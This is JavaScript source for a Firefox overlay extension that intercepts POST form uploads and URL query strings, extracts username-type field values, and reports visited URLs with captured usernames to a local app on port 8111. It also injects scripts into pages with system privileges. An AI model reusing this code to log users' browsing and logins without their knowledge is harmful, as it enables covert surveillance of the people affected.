"use strict";

//https://developer.mozilla.org/en-US/Add-ons/Overlay_Extensions/XUL_School/Intercepting_Page_Loads
//https://developer.mozilla.org/en-US/Add-ons/Overlay_Extensions/XUL_School/Intercepting_Page_Loads

var _commonInterfaceName = "helper";

var _port = '8111';
var _appUrl = 'http://localhost:' + _port + '/';
var _debug = false;
var _fields = [
    'username',
    'uname',
    'user',
    'login',
    'user_name'
];
var _sessions = {};

function log() {
    if (!_debug)
        return;
    var str = [];
    for (i = 0; i < arguments.length; i++) {
        str.push(typeof (arguments[i]) == "object" ? JSON.stringify(arguments[i]) : arguments[i]);
    }
    console.log(str.join(' '));
}

Cu.import('resource://gre/modules/Services.jsm');

const ScriptableInputStream = Components.Constructor(
  "@mozilla.org/scriptableinputstream;1",
  "nsIScriptableInputStream",
  "init");

function observeRequest(channel, topic, data) {
    let post = null;

    if (!(channel instanceof Ci.nsIHttpChannel) ||
      !(channel instanceof Ci.nsIUploadChannel)) {
        return post;
    }
    if (channel.requestMethod !== 'POST') {
        return post;
    }

    try {
        let us = channel.uploadStream;
        if (!us) {
            return post;
        }
        if (us instanceof Ci.nsIMultiplexInputStream) {
            // Seeking in a nsIMultiplexInputStream effectively breaks the stream.
            return post;
        }
        if (!(us instanceof Ci.nsISeekableStream)) {
            // Cannot seek within the stream :(
            return post;
        }

        let oldpos = us.tell();
        us.seek(0, 0);

        try {
            let is = new ScriptableInputStream(us);

            // we'll read max 64k
            let available = Math.min(is.available(), 1 << 16);
            if (available) {
                post = is.read(available);
            }
        }
        finally {
            // Always restore the stream position!
            us.seek(0, oldpos);
        }
    }
    catch (ex) {
        log(ex);
    }
    return post;
}

var _httpRequestObserver = {
    observe: function (subject, topic, data) {
        if (topic == "http-on-modify-request") {
            var post = observeRequest(subject, topic, data);
            if (post) {
                var pos = 0;
                var token = "Content-Disposition: form-data; name=";
                var l = token.length;
                while ((pos = post.indexOf(token, pos)) != -1) {
                    var fieldName = post.substring(pos + l + 1, post.indexOf("\"", pos + l + 1));
                    if (_fields.indexOf(fieldName.toLowerCase()) != -1) {
                        var tmp = post.substring(pos);
                        var lines = tmp.split("\r\n");
                        var httpChannel = subject.QueryInterface(Ci.nsIHttpChannel);
                        _sessions[httpChannel.URI.host + httpChannel.URI.path] = lines[2];
                    }
                    pos += l;
                }
            }
        }
        /*else if (topic == "http-on-examine-response") {
            var httpChannel = subject.QueryInterface(Ci.nsIHttpChannel);
            var domWindow = _httpRequestObserver.getBrowserFromChannel(httpChannel);
            if (domWindow) {
                if (domWindow.top.document && domWindow.location === domWindow.top.document.location) {
                    var url = httpChannel.referrer.spec;
                    if (_sessions[url]) {
                        notifyApp("POST", domWindow.location.url, _sessions[url]);
                        delete _sessions[url];
                    }
                    else {
                        var completed = processUrl(domWindow.location.href);
                        notifyApp("GET", domWindow.location.href, completed ? completed.username : "");
                    }
                } 
            }
        }*/
    },
    getBrowserFromChannel: function (channel) {
        try {
            var notificationCallbacks =
              channel.notificationCallbacks ? channel.notificationCallbacks : channel.loadGroup.notificationCallbacks;

            if (!notificationCallbacks)
                return null;

            var domWin = notificationCallbacks.getInterface(Components.interfaces.nsIDOMWindow);
            return domWin;
        }
        catch (e) {
            
        }
        return null;
    }
};

var _helper = {
    // { path: "", frames: "", data: "", js: ""}
    contentScripts: [{ js: "jquery-1.11.3.min.js", frames: false }, { js: "content.js", frames: false }, { js: "forms.js", frames: false }],
    contexts: [],
    onLoad: function () {
        Services.obs.addObserver(_httpRequestObserver, "http-on-modify-request", false);
        Services.obs.addObserver(_httpRequestObserver, "http-on-examine-response", false);
        _helper.setContentHandler();
        var file = Components["stack"]["caller"].filename.replace(/\\/g, "/");
        var directory = file.replace(/.* -> |[^\/]+$/g, "").replace(/\\/g, "/");
        for (var i = 0; i < _helper.contentScripts.length; i++) {
            _helper.contentScripts[i]["path"] = directory + _helper.contentScripts[i].js;
            var request = Components["classes"]["@mozilla.org/xmlextras/xmlhttprequest;1"]["createInstance"]();
            request.open("GET", _helper.contentScripts[i]["path"], true);
            request.onreadystatechange = function (i, request) {
                return function () {
                    if (request.readyState == 4)
                        _helper.contentScripts[i]["data"] = request.responseText;
                }
            }(i, request);
            request.overrideMimeType("text/plain");
            request.send();
        }
    },
    onUnload: function () {
        Services.obs.removeObserver(_httpRequestObserver, "http-on-modify-request");
        Services.obs.removeObserver(_httpRequestObserver, "http-on-examine-response");
    },
    setContentHandler: function () {
        gBrowser.addEventListener("DOMContentLoaded", function (aEvent) {
            function isTopLevelDocument(aDocument) {
                var browsers = gBrowser["browsers"];
                for (var i = 0; i < browsers.length; i++) {
                    if (aDocument == browsers[i]["contentDocument"])
                        return true;
                }
                return false;
            }
            var doc = aEvent["originalTarget"];
            var wnd = doc["defaultView"];
            var topWindow = isTopLevelDocument(doc);
            if (wnd.location.href.indexOf("about:") === 0 || doc["contentType"] !== "text/html")
                return;
            var context = _helper.createSandbox(wnd);
            for (var i = 0; i < _helper.contentScripts.length; i++) {
                try {
                    if (topWindow || (!topWindow && _helper.contentScripts[i]["frames"] == true)) {
                        if (_helper.contentScripts[i]["data"]) {
                            Components["utils"]["evalInSandbox"](_helper.contentScripts[i]["data"], context, "1.8", _helper.contentScripts[i]["path"], 0);
                        }
                    }
                }
                catch (e) { console.log(e); }
            }
            _helper.contexts.push(context);
            wnd.addEventListener("unload", function () {
                for (var i = 0; i < _helper.contexts.length; i++) {
                    if (_helper.contexts[i] == context) {
                        delete _helper.contexts[i];
                        _helper.contexts.splice(i, 1);
                    }
                }
            }, false)
        }, true);
    },
    createSandbox: function (wrappedWindow) {
        var unsafeWindow = wrappedWindow["wrappedJSObject"];
        var systemPrincipal = Components["classes"]["@mozilla.org/systemprincipal;1"]["createInstance"](Components["interfaces"]["nsIPrincipal"]);
        var sandbox = Components["utils"]["Sandbox"](systemPrincipal, { "sandboxPrototype": new XPCNativeWrapper(unsafeWindow) });
        sandbox[_commonInterfaceName] = new ContentHelper(wrappedWindow);
        Components["utils"]["evalInSandbox"]("var document = window.document;", sandbox);
        return sandbox;
    }
};

var ContentHelper = function (w) {
    var self = this;

    function onHashchange(event, callback) {
        var completed = processUrl(event.url);
        notifyApp("GET", event.url, completed ? completed.username : "");
    }

    function onComplete(event, callback) {
        if (_sessions[event.host]) {
            notifyApp("POST", event.url, _sessions[event.host]);
            delete _sessions[event.host];
        }
        else {
            var completed = processUrl(event.url);
            notifyApp("GET", event.url, completed ? completed.username : "");
        }
    }

    function onFieldsFound(event, callback) {
        _fields = event.fields.concat(_fields);
    }

    self["onHashchange"] = onHashchange;
    self["onComplete"] = onComplete;
    self["onFieldsFound"] = onFieldsFound;
};

window.addEventListener("unload", _helper.onUnload, false);

_helper.onLoad();

function processUrl(url) {
    var completed = null;
    var p = url.indexOf("?");
    if (p != -1) {
        url = url.substr(p + 1);
        var tmp = url.substring(0, url.indexOf("#"));
        if (tmp.length > 0)
            url = tmp;
        var pairs = url.split("&");
        for (var i = 0; i < pairs.length; ++i) {
            var v = pairs[i].split("=");
            if (v && v.length == 2 && _fields.indexOf(v[0].toLowerCase()) != -1) {
                completed = {};
                completed.url = url;
                completed.username = v[1];
                completed.verb = "GET";
                return completed;
            }
        }
    }
    return completed;
}

function notifyApp(verb, url, username) {
    var t = Date.now();
    var params = {
        verb: verb,
        url: url,
        username: username
    };
    try {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", _appUrl + '?_=' + t, true);
        xmlhttp.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
        xmlhttp.onreadystatechange = function (e) {
            if (xmlhttp.readyState === 4) {
                if (xmlhttp.status === 200) {

                }
                else {

                }
            }
        };
        xmlhttp.send(JSON.stringify(params));
    }
    catch (e) {
        log(e);
    }
    log(params);
}




